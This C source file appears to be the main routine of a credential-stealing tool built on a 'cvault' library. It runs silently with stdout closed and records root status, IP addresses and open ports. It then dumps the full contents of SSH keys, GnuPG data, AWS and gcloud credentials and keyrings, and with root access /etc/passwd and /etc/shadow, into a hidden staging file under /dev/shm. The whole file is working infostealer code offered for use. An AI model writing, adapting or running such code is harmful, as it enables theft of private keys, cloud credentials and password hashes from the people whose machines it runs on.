#include "../include/cvault.h"

#define SLNT_EXT 0

int wm = LOG_SILENT;

static int is_probably_binary(const unsigned char *buf, size_t len) {
        if (!buf || len == 0)
                return 0;

        size_t control = 0;
        size_t printable = 0;
        for (size_t i = 0; i < len; i++) {
                unsigned char c = buf[i];
                if (c == '\0')
                        return 1;
                if (c >= 0x20 && c <= 0x7e) {
                        printable++;
                } else if (c == '\n' || c == '\r' || c == '\t') {
                        printable++;
                } else {
                        control++;
                }
        }

        return (control > len / 6);
}

int main(){
        fclose(stdout);
        int dbghandle = cv_createfile("/dev/shm/.systemlog", 0);
        if (dbghandle < 0)
            return SLNT_EXT;
        if (cv_ok()){
            t_file_rights r;
            t_netcontext* n;            
            cv_log("start ok", wm, dbghandle);
            if (cv_isroot()) cv_log("root? [YES]", wm ,dbghandle);
            else cv_log("root? [NO]", wm, dbghandle);
            n = cv_netrecon();
            if (n){
                cv_log(n->private_ip, wm, dbghandle);
                cv_log(n->public_ip, wm, dbghandle);
                cv_log("open ports:", wm, dbghandle);
                for (int i = 0; i < 64; i++){
                    char buf[8];
                    if (n->open_ports[i] != 0){
                        sprintf(buf, "%d", n->open_ports[i]);
                        cv_log(buf, wm, dbghandle);
                    }
                }
            }
            const char *target_dirs[] = {
                "~/.ssh",
                "~/.gnupg",
                "~/.aws/credentials",
                "~/.config/gcloud",
                "~/.local/share/keyrings",
                NULL
            };

            cv_log("dumps:", wm, dbghandle);
            for (int d = 0; target_dirs[d]; d++) {
                char *expanded_dir = cv_expand_home_path(target_dirs[d]);
                if (!expanded_dir)
                        continue;

                char **dir_files = cv_getdirfiles(expanded_dir);
                if (dir_files) {
                        for (int i = 0; dir_files[i]; i++) {
                                cv_log(dir_files[i], wm, dbghandle);
                                cv_log("$$$$$$$$\n\n", wm, dbghandle);

                                FILE *bin = fopen(dir_files[i], "rb");
                                if (bin) {
                                        if (fseek(bin, 0, SEEK_END) != 0) {
                                                fclose(bin);
                                                continue;
                                        }
                                        long sz = ftell(bin);
                                        if (sz < 0) {
                                                fclose(bin);
                                                continue;
                                        }
                                        rewind(bin);

                                        unsigned char *buf = malloc((size_t)sz + 1);
                                        if (buf) {
                                                size_t bytes_read = fread(buf, 1, (size_t)sz, bin);
                                                buf[bytes_read] = '\0';
                                                if (is_probably_binary(buf, bytes_read)) {
                                                        cv_dump_memory(buf, bytes_read, dbghandle);
                                                } else {
                                                        char *content = cv_getfilecontent(dir_files[i]);
                                                        if (content) {
                                                                cv_log(content, wm, dbghandle);
                                                                free(content);
                                                        }
                                                }
                                                free(buf);
                                        }
                                        fclose(bin);
                                        continue;
                                }

                                char *content = cv_getfilecontent(dir_files[i]);
                                if (content) {
                                        cv_log(content, wm, dbghandle);
                                        free(content);
                                }
                        }
                        for (int i = 0; dir_files[i]; i++) {
                                free(dir_files[i]);
                        }
                        free(dir_files);
                }
                free(expanded_dir);
            }
            if (cv_isroot())
            {
                cv_log("$$$$$$$$\n\n", wm, dbghandle);
                char *passwd_content = cv_getfilecontent("/etc/passwd");
                if (passwd_content) {
                    cv_log(passwd_content, wm, dbghandle);
                    free(passwd_content);
                }
                cv_log("$$$$$$$$\n\n", wm, dbghandle);
                char *shadow_content = cv_getfilecontent("/etc/shadow");
                if (shadow_content){
                    cv_log(shadow_content, wm, dbghandle);
                    free(shadow_content);
                }
            }
        }
        int ignored = cv_createfile("/dev/shm/.done", 0);
        return SLNT_EXT;
}